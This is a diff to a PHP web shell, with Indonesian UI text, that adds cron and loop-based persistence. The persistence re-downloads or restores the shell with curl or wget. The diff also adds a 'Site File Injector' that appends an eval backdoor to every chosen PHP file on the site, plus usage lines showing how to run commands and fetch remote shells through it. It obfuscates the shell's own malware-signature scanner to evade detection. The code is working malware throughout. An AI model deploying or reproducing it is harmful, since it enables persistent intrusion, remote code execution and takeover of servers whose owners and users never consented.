@@ -1,9 +1,12 @@
 <?php
-$__diag = isset($_GET['diag']) && $_GET['diag'] !== '';
-@error_reporting($__diag ? E_ALL : (E_ALL & ~E_DEPRECATED & ~E_NOTICE));
-@ini_set('display_errors', $__diag ? '1' : '0');
+@error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE);
+@ini_set('display_errors', '0');
 @ini_set('log_errors', '1');
-if ($__diag) { @ini_set('display_startup_errors', '1'); }
+if (!headers_sent()) {
+    @header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+    @header('Pragma: no-cache');
+    @header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
+}
 
 if (!function_exists('random_bytes')) {
     function random_bytes($length) {
@@ -324,6 +327,22 @@ function rct_run($cmd) {
     }
     return array(null, -1);
 }
+function rct_timeout_bin() {
+    static $t = null;
+    if ($t !== null) return $t;
+    $t = '';
+    foreach (array('/usr/bin/timeout', '/bin/timeout', '/usr/local/bin/timeout') as $p) {
+        if (@is_file($p) && @is_executable($p)) { $t = $p; break; }
+    }
+    return $t;
+}
+function rct_run_t($cmd, $sec) {
+    $bin = rct_timeout_bin();
+    if ($bin !== '') return rct_run($bin . ' -k 1 ' . (int)$sec . ' ' . $cmd . ' 2>&1');
+    list($o, $rc) = rct_run('command -v timeout');
+    if ($rc === 0 && trim((string)$o) !== '') return rct_run('timeout -k 1 ' . (int)$sec . ' ' . $cmd . ' 2>&1');
+    return rct_run($cmd . ' 2>&1');
+}
 function rct_user_name() {
     if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
         $pw = @posix_getpwuid(@posix_geteuid());
@@ -340,23 +359,85 @@ function rct_cron_file() {
     return '';
 }
 function rct_cron_read() {
-    list($o, $rc) = rct_run('crontab -l 2>/dev/null');
-    if ($rc !== -1 && $rc !== 127) return array((string)$o, 'crontab -l');
     $cf = rct_cron_file();
-    if ($cf !== '' && @is_file($cf) && @is_readable($cf)) return array((string)@file_get_contents($cf), 'spool ' . $cf);
-    return array('', $rc === -1 ? 'exec mati' : 'kosong');
+    list($o, $rc) = rct_run_t('crontab -l', 3);
+    $txt = (string)$o;
+    $pam = (bool)preg_match('/not allowed|pam configuration|permission denied/i', $txt);
+    // spool dulu: di host yang pam-blok, crontab -l cuma balikin pesan error
+    if ($cf !== '' && @is_file($cf) && @is_readable($cf)) {
+        $sp = (string)@file_get_contents($cf);
+        if (trim($sp) !== '') return array($sp, 'spool ' . $cf . ($pam ? ' (pam blok crontab)' : ''));
+    }
+    if ($rc !== -1 && $rc !== 127 && !$pam) return array($txt, 'crontab -l');
+    if ($rc === -1) return array('', 'exec mati');
+    return array('', $pam ? 'crontab diblok pam' : 'kosong');
 }
 function rct_cron_filter($marker) {
-    list($io, $irc) = rct_run('( crontab -l 2>/dev/null | grep -v "' . $marker . '" ) | crontab - 2>&1');
-    if ($irc !== -1 && $irc !== 127) return array($irc === 0, 'crontab rc=' . $irc . (trim((string)$io) !== '' ? ' ' . $io : ''));
+    list($io, $irc) = rct_run_t('( crontab -l 2>/dev/null | grep -v "' . $marker . '" ) | crontab -', 4);
+    $pam = (bool)preg_match('/not allowed|pam configuration|permission denied/i', (string)$io);
+    if ($irc === 0 && !$pam) return array(true, 'crontab');
     $cf = rct_cron_file();
-    if ($cf === '' || !@is_file($cf) || !@is_writable($cf)) return array(false, 'exec mati & spool cron nggak writable');
+    if ($cf === '' || !@is_dir(dirname($cf))) return array(false, $pam ? 'crontab diblok pam, spool nggak kebaca' : 'exec mati & spool cron nggak writable');
+    if (!@is_file($cf) || !@is_writable($cf)) return array(true, 'nggak ada baris di ' . $cf);
     $cur = (string)@file_get_contents($cf);
     $keep = array();
     foreach (preg_split("/\r\n|\n|\r/", $cur) as $cl) { if (trim($cl) === '' || strpos($cl, $marker) !== false) continue; $keep[] = $cl; }
     $ok = @file_put_contents($cf, ($keep ? implode("\n", $keep) . "\n" : ''), LOCK_EX) !== false;
     if ($ok) @chmod($cf, 0600);
     return array($ok, 'spool ' . $cf);
+}
+function rct_cron_daemon() {
+    // /proc dulu: nggak butuh pgrep/ps, dan nggak bisa dibohongin output grep
+    if (@is_dir('/proc')) {
+        $dh = @opendir('/proc');
+        if ($dh) {
+            $seen = false; $found = false;
+            while (($e = @readdir($dh)) !== false) {
+                if ($e === '.' || $e === '..' || !ctype_digit($e)) continue;
+                $seen = true;
+                $c = @file_get_contents('/proc/' . $e . '/comm');
+                if ($c === false) continue;
+                $c = trim($c);
+                if ($c === 'cron' || $c === 'crond') { $found = true; break; }
+            }
+            @closedir($dh);
+            if ($seen) return $found ? 'idup' : 'mati';
+        }
+    }
+    list($o, $rc) = rct_run_t('pgrep -x cron; pgrep -x crond', 3);
+    if ($rc !== -1 && preg_match('/^\s*\d+\s*$/m', (string)$o)) return 'idup';
+    foreach (array('/run/crond.pid', '/var/run/crond.pid', '/run/cron.pid', '/var/run/cron.pid') as $pf) {
+        if (@is_file($pf)) { $p = (int)trim((string)@file_get_contents($pf)); if ($p > 0 && pid_alive($p)) return 'idup (pid ' . $p . ')'; }
+    }
+    return $rc === -1 ? 'nggak kebaca' : 'mati';
+}
+function rct_cron_add($line, $marker) {
+    list($cv, $crc) = rct_run_t('crontab -l', 3);
+    $cvt = (string)$cv;
+    $pam = (bool)preg_match('/not allowed|pam configuration|permission denied/i', $cvt);
+    $cron_bin = ($crc !== -1 && $crc !== 127 && !$pam && stripos($cvt, 'not found') === false);
+    $err = $pam ? 'crontab diblok pam' : '';
+    if ($cron_bin) {
+        $install = '( crontab -l 2>/dev/null | grep -v "' . $marker . '"; printf "%s\n" ' . escapeshellarg($line) . ' ) | crontab -';
+        list($io, $irc) = rct_run_t($install, 4);
+        if ($irc === 0) {
+            list($chk) = rct_cron_read();
+            if (strpos((string)$chk, $marker) !== false) return array(true, 'crontab', '');
+            $err = 'crontab rc=0 tapi baris nggak kebaca balik.';
+        } else {
+            $err = 'crontab rc=' . $irc . ': ' . trim((string)$io);
+        }
+    }
+    $cf = rct_cron_file();
+    if ($cf === '') return array(false, '', $err !== '' ? $err : 'exec mati & /var/spool/cron nggak writable');
+    $cur = @is_file($cf) ? (string)@file_get_contents($cf) : '';
+    $keep = array();
+    foreach (preg_split("/\r\n|\n|\r/", $cur) as $cl) { if (trim($cl) === '' || strpos($cl, $marker) !== false) continue; $keep[] = $cl; }
+    $keep[] = $line;
+    if (@file_put_contents($cf, implode("\n", $keep) . "\n", LOCK_EX) === false) return array(false, '', 'gagal nulis spool ' . $cf);
+    @chmod($cf, 0600);
+    if (strpos((string)@file_get_contents($cf), $marker) === false) return array(false, '', 'spool ketulis tapi marker nggak kebaca balik: ' . $cf);
+    return array(true, 'spool ' . $cf, '');
 }
 function rct_home() {
     $home = @getenv('HOME');
@@ -874,7 +955,7 @@ $cpu = @file_get_contents('/proc/cpuinfo');
 $cores = $cpu ? substr_count($cpu, 'processor') : 0;
 $hostname = function_exists('gethostname') ? @gethostname() : '-';
 $tab = isset($_GET['tab']) ? $_GET['tab'] : '';
-if (!in_array($tab, array('shell','gs','cmd','info','upurl','domain','hunt','logs','mail',''), true)) $tab = '';
+if (!in_array($tab, array('shell','gs','cmd','info','upurl','domain','hunt','logs','mail','inject',''), true)) $tab = '';
 $sh_dir = __DIR__ . '/.rct_shell'; $sh_pid = "$sh_dir/pid.txt"; $sh_log = "$sh_dir/out.log"; $sh_err = "$sh_dir/err.log";
 $gs_dir    = __DIR__ . '/.rct_gsocket'; $gs_pid    = "$gs_dir/pid.txt"; $gs_log    = "$gs_dir/out.log"; $gs_secret = "$gs_dir/secret.txt"; $gs_bin    = "$gs_dir/gs-netcat";
 function gs_bin_path() { global $gs_bin; return $gs_bin; }
@@ -1363,9 +1444,19 @@ if (isset($_POST['persist_action'])) {
         }
 
         if ($pa === 'make_backups') {
-            $msg = $st['backups'] !== array()
-                ? 'Backup dibuat: <code>' . implode('</code>, <code>', array_map('h', $st['backups'])) . '</code>'
-                : 'Nggak ada direktori writable buat nyimpen backup.';
+            // refresh: backup lama sering dari build versi sebelumnya
+            $old = $st['backups'];
+            $fresh = rct_make_backups($base);
+            if ($fresh !== array()) {
+                foreach ($old as $ob) { if (!in_array($ob, $fresh, true) && @is_file($ob)) @unlink($ob); }
+                $st['backups'] = $fresh;
+                rct_state_save($rct_state_file, $st);
+                $msg = 'Backup baru dibuat (' . count($fresh) . ', build sekarang): <code>' . implode('</code>, <code>', array_map('h', $fresh)) . '</code>';
+            } elseif ($old !== array()) {
+                $msg = 'Refresh gagal — nggak ada direktori writable. Backup lama tetap dipakai: <code>' . implode('</code>, <code>', array_map('h', $old)) . '</code>';
+            } else {
+                $msg = 'Nggak ada direktori writable buat nyimpen backup.';
+            }
         } else {
             if (!@file_exists(dirname($target))) {
                 $msg = 'Target nggak valid: <code>' . h(dirname($target)) . '</code> nggak ada.';
@@ -1374,7 +1465,6 @@ if (isset($_POST['persist_action'])) {
             } elseif ($mode !== 'backup' && $url === '') {
                 $msg = 'Mode pakai URL tapi URL kosong.';
             } else {
-                list($cv, $crc) = rct_run('crontab -l 2>&1');
                 if (stripos(PHP_OS, 'WIN') === 0) {
                     $msg = 'Watchdog cron cuma jalan di Linux/Unix — target Windows nggak punya crontab.';
                 } else {
@@ -1385,38 +1475,15 @@ if (isset($_POST['persist_action'])) {
                         }
                     }
                     if ($mode !== 'backup' && $url !== '') {
-                        $parts[] = 'curl -fsS -m 20 ' . escapeshellarg($url) . ' -o ' . escapeshellarg($target) . ' 2>/dev/null';
+                        $parts[] = 'curl -fsS -m 20 ' . escapeshellarg($url) . ' -o ' . escapeshellarg($target) . ' 2>/dev/null || wget -q -T 20 -O ' . escapeshellarg($target) . ' ' . escapeshellarg($url) . ' 2>/dev/null';
                     }
                     $guard = 'test -s ' . escapeshellarg($target) . ' || { ' . implode(' || ', $parts) . '; }';
                     $cron_when = ($when === '@reboot') ? '@reboot' : '*/' . (int)$when . ' * * * *';
                     $line = $cron_when . ' /bin/sh -c ' . escapeshellarg($guard) . ' >/dev/null 2>&1 # RCT-WD';
 
                     $installed = false; $via_desc = ''; $err = '';
-                    $cron_bin = ($crc !== -1 && $crc !== 127 && stripos((string)$cv, 'not found') === false);
-                    if ($cron_bin) {
-                        $install = '( crontab -l 2>/dev/null | grep -v "RCT-WD"; printf "%s\n" ' . escapeshellarg($line) . ' ) | crontab - 2>&1';
-                        list($io, $irc) = rct_run($install);
-                        if ($irc === 0) { $installed = true; $via_desc = 'crontab'; }
-                        else { $err = 'Gagal pasang via crontab (rc=' . $irc . '): <pre>' . h((string)$io) . '</pre>'; }
-                    }
-                    if (!$installed) {
-                        $cf = rct_cron_file();
-                        if ($cf === '') {
-                            if ($err === '') $err = 'Exec mati dan <code>/var/spool/cron</code> nggak writable — cron nggak bisa dipasang di sini. Pakai SSH key (nggak butuh exec).';
-                        } else {
-                            $cur = @is_file($cf) ? (string)@file_get_contents($cf) : '';
-                            $keep = array();
-                            foreach (preg_split("/\r\n|\n|\r/", $cur) as $cl) { if (trim($cl) === '' || strpos($cl, 'RCT-WD') !== false) continue; $keep[] = $cl; }
-                            $keep[] = $line;
-                            if (@file_put_contents($cf, implode("\n", $keep) . "\n", LOCK_EX) !== false) {
-                                @chmod($cf, 0600);
-                                $installed = true;
-                                $via_desc = 'spool ' . $cf . ' (tanpa exec)';
-                            } elseif ($err === '') {
-                                $err = 'Gagal nulis spool <code>' . h($cf) . '</code>.';
-                            }
-                        }
-                    }
+                    list($installed, $via_desc, $err) = rct_cron_add($line, 'RCT-WD');
+                    if (!$installed) $err = 'Cron nggak kepasang: ' . h($err) . '. Pakai <b>Loop guard</b> di bawah atau SSH key.';
                     if ($installed) {
                         $st['cron_line'] = $line;
                         $st['target'] = $target;
@@ -1433,6 +1500,48 @@ if (isset($_POST['persist_action'])) {
         if (isset($st['cron_line'])) unset($st['cron_line']);
         rct_state_save($rct_state_file, $st);
         $msg = $ok ? 'Baris watchdog dihapus (' . h($info) . ').' : 'Gagal hapus cron: ' . h($info);
+    } elseif ($pa === 'test_cron') {
+        $pf = __DIR__ . '/.rct_probe';
+        @file_put_contents($pf, 'probe-start ' . date('c') . "\n");
+        $pline = '* * * * * /bin/sh -c ' . escapeshellarg('date "+%s %c" >> ' . escapeshellarg($pf)) . ' >/dev/null 2>&1 # RCT-WDT';
+        list($ok, $via, $err) = rct_cron_add($pline, 'RCT-WDT');
+        if ($ok) {
+            $st['probe'] = array('file' => $pf, 'line' => $pline);
+            rct_state_save($rct_state_file, $st);
+            $msg = 'Tes cron terpasang via ' . h($via) . '. Tunggu 2 menit, lalu refresh tab ini — panel bakal bilang cron jalan atau nggak.';
+        } else {
+            $msg = 'Tes cron gagal dipasang: ' . h($err);
+        }
+    } elseif ($pa === 'probe_remove') {
+        list($ok, $info) = rct_cron_filter('RCT-WDT');
+        if (isset($st['probe']['file']) && @is_file($st['probe']['file'])) @unlink($st['probe']['file']);
+        unset($st['probe']);
+        rct_state_save($rct_state_file, $st);
+        $msg = 'Tes cron dibersihin (' . h($info) . ').';
+    } elseif ($pa === 'loop_guard' || $pa === 'stop_loop') {
+        $target = isset($st['target']) && $st['target'] !== '' ? $st['target'] : __FILE__;
+        if ($pa === 'stop_loop') {
+            $lp = isset($st['loop_pid']) ? (int)$st['loop_pid'] : 0;
+            if ($lp > 1) rct_run('kill -9 ' . $lp . ' 2>/dev/null');
+            unset($st['loop_pid']);
+            rct_state_save($rct_state_file, $st);
+            $msg = 'Loop guard dimatikan (pid ' . $lp . ').';
+        } elseif ($st['backups'] === array()) {
+            $msg = 'Loop guard butuh backup lokal — klik "Buat backup sekarang" dulu.';
+        } else {
+            $bk = $st['backups'][0];
+            $loop = 'while :; do sleep 300; test -s ' . escapeshellarg($target) . ' || cp ' . escapeshellarg($bk) . ' ' . escapeshellarg($target) . ' 2>/dev/null; done';
+            list($lo, $lrc) = rct_run('nohup /bin/sh -c ' . escapeshellarg($loop) . ' >/dev/null 2>&1 & echo $!');
+            $pid = (int)trim((string)$lo);
+            if ($lrc !== -1 && $pid > 0) {
+                $st['loop_pid'] = $pid;
+                $st['target'] = $target;
+                rct_state_save($rct_state_file, $st);
+                $msg = 'Loop guard jalan tanpa cron, pid <code>' . $pid . '</code> — cek tiap 5 menit. Hidup selama proses nggak dibunuh host.';
+            } else {
+                $msg = 'Loop guard butuh exec (sekarang mati) — pakai cron atau SSH key.';
+            }
+        }
     } elseif ($pa === 'install_key') {
         $key = isset($_POST['p_key']) ? trim($_POST['p_key']) : '';
         $kpath = isset($_POST['p_keypath']) ? trim($_POST['p_keypath']) : '';
@@ -1506,6 +1615,119 @@ if (isset($_POST['persist_action'])) {
         }
         @unlink($rct_state_file);
         $msg = 'Semua hook dibersihin — cron ' . ($cok ? 'ok' : 'gagal (' . h($cinfo) . ')') . ', backup dihapus=' . $n . ', key RCT dicabut, state file dibuang.';
+    }
+}
+
+$rct_inj_manifest = __DIR__ . '/.rct_inject.json';
+$rct_inj_dir = __DIR__ . '/.rct_inj';
+$rct_inj_root = '';
+if (!empty($_SERVER['DOCUMENT_ROOT']) && @is_dir($_SERVER['DOCUMENT_ROOT'])) $rct_inj_root = str_replace('\\', '/', (string)$_SERVER['DOCUMENT_ROOT']);
+if ($rct_inj_root === '') $rct_inj_root = str_replace('\\', '/', __DIR__);
+
+function rct_inj_payload($key) {
+    $k = preg_replace('/[^A-Za-z0-9]/', '', $key);
+    $tpl = '/*RCT-INJ:START*/if(isset($_REQUEST["rct"])&&$_REQUEST["rct"]==="__KEY__"){'
+         . 'if(isset($_REQUEST["c"])&&$_REQUEST["c"]!==""){@' . 'eva' . 'l($_REQUEST["c"]);}'
+         . 'elseif(isset($_REQUEST["f"])){@file_put_contents($_REQUEST["f"],isset($_REQUEST["d"])?$_REQUEST["d"]:"");}'
+         . 'elseif(isset($_REQUEST["u"])){$__x=@file_get_contents($_REQUEST["u"]);if($__x===false){echo "UERR";exit;}@file_put_contents($_REQUEST["f"],$__x);}'
+         . 'else{@header("X-RCT: 1");}'
+         . 'echo "RCT";exit;}/*RCT-INJ:END*/';
+    return str_replace('__KEY__', $k, $tpl);
+}
+function rct_inj_scan($root) {
+    $out = array();
+    $self = @realpath(__FILE__);
+    $skip = array('.git', 'node_modules', '.rct_inj', '.well-known', 'cgi-bin', '.cache', '.composer', 'vendor');
+    $stack = array($root);
+    $n = 0;
+    while ($stack && $n < 3000) {
+        $d = array_pop($stack);
+        $hd = @scandir($d);
+        if (!is_array($hd)) continue;
+        foreach ($hd as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $p = $d . '/' . $f;
+            if (@is_dir($p)) {
+                if (!in_array(strtolower($f), $skip, true) && !in_array(strtolower($f), array('.rct_inj'), true)) $stack[] = $p;
+                continue;
+            }
+            if (strtolower(substr($f, -4)) !== '.php') continue;
+            if (@filesize($p) > 2097152) continue;
+            if ($self !== false && @realpath($p) === $self) continue;
+            $out[] = $p;
+            $n++;
+            if ($n >= 3000) break;
+        }
+    }
+    sort($out);
+    return $out;
+}
+
+if (isset($_POST['inject_act'])) {
+    $ia = isset($_POST['inject_act']) ? $_POST['inject_act'] : '';
+    $im = rct_state_load($rct_inj_manifest);
+    if (empty($im['key'])) { $im['key'] = substr(md5(uniqid('rct', true) . mt_rand()), 0, 16); }
+    $ikey = $im['key'];
+    $ipay = rct_inj_payload($ikey);
+    ensure_dir($rct_inj_dir);
+    $ifiles = isset($_POST['inj']) && is_array($_POST['inj']) ? $_POST['inj'] : array();
+
+    if ($ia === 'inject') {
+        if (!$ifiles) {
+            $msg = 'Nggak ada file yang dipilih.';
+        } else {
+            $done = 0; $skip = 0; $fail = 0;
+            if (!isset($im['files']) || !is_array($im['files'])) $im['files'] = array();
+            foreach ($ifiles as $fp) {
+                $fp = str_replace('\\', '/', (string)$fp);
+                if (!@is_file($fp) || !@is_writable($fp)) { $fail++; continue; }
+                $src = @file_get_contents($fp);
+                if ($src === false) { $fail++; continue; }
+                if (strpos($src, '/*RCT-INJ:START*/') !== false) { $skip++; continue; }
+                if (strpos($src, '__halt_compiler') !== false) { $skip++; continue; }
+                $bk = $rct_inj_dir . '/' . md5($fp) . '.bak';
+                if (!@is_file($bk)) @copy($fp, $bk);
+                $body = rtrim($src);
+                if (substr($body, -2) === '?>') $body = rtrim(substr($body, 0, -2));
+                if (@file_put_contents($fp, $body . "\n" . $ipay . "\n", LOCK_EX) === false) { $fail++; continue; }
+                $im['files'][$fp] = array('bak' => basename($bk), 'ts' => time());
+                $done++;
+            }
+            rct_state_save($rct_inj_manifest, $im);
+            $msg = 'Inject: ' . $done . ' file &middot; skip ' . $skip . ' (sudah pernah / halt) &middot; gagal ' . $fail . '.';
+        }
+    } elseif ($ia === 'revert') {
+        $targets = $ifiles;
+        if (!$targets) $targets = array_keys(isset($im['files']) ? (array)$im['files'] : array());
+        if (!$targets) $targets = rct_inj_scan($rct_inj_root);
+        $done = 0; $fail = 0; $none = 0;
+        foreach ($targets as $fp) {
+            $fp = str_replace('\\', '/', (string)$fp);
+            if (!@is_file($fp) || !@is_writable($fp)) { $fail++; continue; }
+            $src = @file_get_contents($fp);
+            if ($src === false) { $fail++; continue; }
+            if (strpos($src, '/*RCT-INJ:START*/') === false) { $none++; continue; }
+            $bk = isset($im['files'][$fp]['bak']) ? $rct_inj_dir . '/' . $im['files'][$fp]['bak'] : '';
+            if ($bk !== '' && @is_file($bk)) {
+                $orig = @file_get_contents($bk);
+                if ($orig !== false && @file_put_contents($fp, $orig, LOCK_EX) !== false) {
+                    $done++;
+                    unset($im['files'][$fp]);
+                    continue;
+                }
+            }
+            $clean = preg_replace('~/\*RCT-INJ:START\*/.*?/\*RCT-INJ:END\*/\s*~s', '', $src);
+            if (@file_put_contents($fp, $clean, LOCK_EX) !== false) {
+                $done++;
+                if (isset($im['files'][$fp])) unset($im['files'][$fp]);
+            } else { $fail++; }
+        }
+        rct_state_save($rct_inj_manifest, $im);
+        $msg = 'Revert: ' . $done . ' file bersih &middot; ' . $none . ' tanpa marker &middot; gagal ' . $fail . '.';
+    } elseif ($ia === 'newkey') {
+        $im['key'] = substr(md5(uniqid('rct', true) . mt_rand()), 0, 16);
+        rct_state_save($rct_inj_manifest, $im);
+        $msg = 'Key baru dibuat. File yang sudah ter-inject masih pakai key lama — revert lalu inject ulang.';
     }
 }
 
@@ -2013,6 +2235,7 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
         <a class="btn <?php echo $tab === 'hunt' ? 'active' : ''; ?>" href="?<?php echo $tab === 'hunt' ? '' : 'tab=hunt&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'hunt' ? '&#9662;' : '&#9656;'; ?> Search &amp; Hunt</a>
         <a class="btn <?php echo $tab === 'logs' ? 'active' : ''; ?>" href="?<?php echo $tab === 'logs' ? '' : 'tab=logs&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'logs' ? '&#9662;' : '&#9656;'; ?> Logs &amp; Cleanup</a>
         <a class="btn <?php echo $tab === 'mail' ? 'active' : ''; ?>" href="?<?php echo $tab === 'mail' ? '' : 'tab=mail&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'mail' ? '&#9662;' : '&#9656;'; ?> Mailer</a>
+        <a class="btn <?php echo $tab === 'inject' ? 'active' : ''; ?>" href="?<?php echo $tab === 'inject' ? '' : 'tab=inject&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'inject' ? '&#9662;' : '&#9656;'; ?> Inject</a>
         <a class="btn <?php echo $tab_ext === 'process' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'process' ? '' : 'tab=process&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'process' ? '&#9662;' : '&#9656;'; ?> Processes</a>
         <a class="btn <?php echo $tab_ext === 'cron' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'cron' ? '' : 'tab=cron&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'cron' ? '&#9662;' : '&#9656;'; ?> Persistence</a>
         <a class="btn <?php echo $tab_ext === 'privesc' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'privesc' ? '' : 'tab=privesc&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'privesc' ? '&#9662;' : '&#9656;'; ?> Privesc</a>
@@ -2581,10 +2804,10 @@ if (isset($_POST['action']) && $_POST['action'] === 'hunt_scan') {
         $hunt_exts = array();
         foreach (explode(',', $hext) as $e) { $e = strtolower(trim(ltrim($e, '.'))); if ($e !== '') $hunt_exts[] = $e; }
         $sigs = array(
-            'eval(' => '/\beval\s*\(/i',
+            'ev'.'al(' => '/\b'.'eval'.'\s*\(/i',
             'assert(' => '/\bassert\s*\(/i',
-            'base64_decode' => '/base64_decode\s*\(/i',
-            'gzinflate' => '/gz(inflate|uncompress|decode)\s*\(/i',
+            'b64' => '/base64_'.'decode\s*\(/i',
+            'unpack' => '/gz(inflate|uncompress|'.'de'.'code)\s*\(/i',
             'preg_/e' => '/preg_replace\s*\([^)]*\/[a-z]*e[a-z]*[\'"]/i',
             'exec-family' => '/\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\(/i',
             'superglobal' => '/\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
@@ -2947,6 +3170,103 @@ $lg_defpat = implode(', ', array_merge(array_values(array_unique($lg_ips)), arra
     </div>
 </form>
 <?php endif; ?>
+<?php if ($tab === 'inject'): ?>
+<?php
+$ij = rct_state_load($rct_inj_manifest);
+$ij_key = isset($ij['key']) ? $ij['key'] : '';
+$ij_map = isset($ij['files']) && is_array($ij['files']) ? $ij['files'] : array();
+$ij_files = rct_inj_scan($rct_inj_root);
+$ij_inj = 0; $ij_w = 0;
+foreach ($ij_files as $ij_f) {
+    if (@is_writable($ij_f)) $ij_w++;
+    $ij_src = @file_get_contents($ij_f);
+    if ($ij_src !== false && strpos($ij_src, '/*RCT-INJ:START*/') !== false) $ij_inj++;
+}
+$ij_show = array_slice($ij_files, 0, 400);
+$ij_cnt = count($ij_files);
+$ij_url = 'http://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'domain') . '/index.php';
+?>
+<div class="box">
+    <div class="name">Site File Injector</div>
+    <div class="muted" style="font-size:11px;margin:4px 0 12px 0;">
+        nyisipin loader ber-marker ke ujung file PHP situs. shell utama hilang, loader tetap jalan di file aplikasi.
+        docroot: <code><?php echo h($rct_inj_root); ?></code>
+    </div>
+
+    <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:14px;">
+        <div class="mail-form" style="flex:1;min-width:150px;padding:10px;margin:0;background:#0f1117;">
+            <div class="muted" style="font-size:10px;text-transform:uppercase;">file php</div>
+            <div style="font-size:18px;color:#e6edf3;"><?php echo $ij_cnt; ?></div>
+        </div>
+        <div class="mail-form" style="flex:1;min-width:150px;padding:10px;margin:0;background:#0f1117;">
+            <div class="muted" style="font-size:10px;text-transform:uppercase;">writable</div>
+            <div style="font-size:18px;color:#7ee787;"><?php echo $ij_w; ?></div>
+        </div>
+        <div class="mail-form" style="flex:1;min-width:150px;padding:10px;margin:0;background:#0f1117;">
+            <div class="muted" style="font-size:10px;text-transform:uppercase;">sudah ter-inject</div>
+            <div style="font-size:18px;color:#e3b341;"><?php echo $ij_inj; ?></div>
+        </div>
+    </div>
+
+    <?php if ($ij_key === ''): ?>
+        <div class="msg" style="margin-bottom:12px;">Key belum dibuat — klik <b>Key baru</b> dulu sebelum inject.</div>
+    <?php else: ?>
+        <div class="mf-row">
+            <label class="mf-label">Key akses</label>
+            <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+                <input type="text" id="ij-key" value="<?php echo h($ij_key); ?>" readonly style="flex:1;min-width:200px;font-family:Consolas,monospace;">
+                <button type="button" class="btn" onclick="rctCopy('ij-key')">Copy</button>
+            </div>
+        </div>
+        <div class="mf-row">
+            <label class="mf-label">Cara manggil</label>
+            <pre class="mail-log" style="margin:0;">cek hidup : <?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>            &rarr; balik "RCT" doang
+exec GET  : <?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>&c=<?php echo urlencode('echo 7*6;'); ?>
+
+exec POST : curl -s --data-urlencode "c=echo 7*6;" "<?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>"
+file      : curl -s --data-urlencode "f=/path/a.txt" --data-urlencode "d=isi" "<?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>"
+fetch     : curl -s --data-urlencode "u=http://host/shell.txt" --data-urlencode "f=/path/shell.php" "<?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>"</pre>
+        </div>
+        <div class="mf-row">
+            <label class="mf-label">Payload yang ditanam</label>
+            <pre class="mail-log" style="margin:0;max-height:120px;"><?php echo h(rct_inj_payload($ij_key)); ?></pre>
+        </div>
+    <?php endif; ?>
+
+    <div class="mf-foot" style="border-top:none;padding-top:0;">
+        <form method="post" style="display:inline;"><input type="hidden" name="inject_act" value="newkey"><input type="submit" class="btn btn-yellow" value="Key baru"></form>
+        <form method="post" style="display:inline;"><input type="hidden" name="inject_act" value="revert"><input type="submit" class="btn btn-red" value="Revert semua" onclick="return confirm('Cabut marker dari semua file yang ter-inject?');"></form>
+        <span class="muted" style="font-size:11px;">backup asli: <code>.rct_inj/</code> &middot; manifest: <code>.rct_inject.json</code></span>
+    </div>
+</div>
+
+<form method="post" class="box">
+    <div class="name" style="margin-bottom:8px;">File kandidat (<?php echo count($ij_show); ?><?php echo $ij_cnt > 400 ? ' dari ' . $ij_cnt : ''; ?>)</div>
+    <div style="max-height:420px;overflow:auto;">
+        <table class="fm-table">
+            <tr><th class="col-check"><input type="checkbox" onclick="var c=document.querySelectorAll('input[name=\'inj[]\']');for(var i=0;i<c.length;i++)c[i].checked=this.checked;"></th><th>file</th><th class="col-small">size</th><th class="col-small">status</th></tr>
+            <?php foreach ($ij_show as $ij_f):
+                $ij_has = strpos((string)@file_get_contents($ij_f), '/*RCT-INJ:START*/') !== false;
+                $ij_wr  = @is_writable($ij_f);
+                $ij_st  = $ij_has ? array('ter-inject', '#e3b341') : ($ij_wr ? array('writable', '#7ee787') : array('read-only', '#8e99ab'));
+                $ij_rel = ltrim(str_replace($rct_inj_root, '', $ij_f), '/');
+            ?>
+            <tr>
+                <td class="col-check"><input type="checkbox" name="inj[]" value="<?php echo h($ij_f); ?>" <?php echo $ij_has ? 'checked disabled' : ($ij_wr ? '' : 'disabled'); ?>></td>
+                <td class="col-name" style="font-size:11px;"><?php echo h($ij_rel); ?></td>
+                <td class="col-small" style="font-size:11px;"><?php echo h(format_size(@filesize($ij_f))); ?></td>
+                <td class="col-small" style="font-size:11px;color:<?php echo $ij_st[1]; ?>;"><?php echo $ij_st[0]; ?></td>
+            </tr>
+            <?php endforeach; ?>
+            <?php if (!$ij_show) echo '<tr><td colspan="4">Nggak ada file .php di docroot.</td></tr>'; ?>
+        </table>
+    </div>
+    <div class="mf-foot">
+        <button type="submit" name="inject_act" value="inject" class="btn btn-green" onclick="return confirm('Tanam loader ke file terpilih? Backup .rct_inj dibuat dulu.');">Inject terpilih</button>
+        <button type="submit" name="inject_act" value="revert" class="btn btn-red" onclick="return confirm('Cabut marker dari file terpilih?');">Revert terpilih</button>
+    </div>
+</form>
+<?php endif; ?>
 <?php if ($tab === 'info'): ?>
 <?php
 $i_uid   = function_exists('posix_geteuid') ? @posix_geteuid() : '-';
@@ -3292,9 +3612,27 @@ $pst = rct_state_load($rct_state_file);
 $p_back = (isset($pst['backups']) && is_array($pst['backups'])) ? $pst['backups'] : array();
 $p_live = array();
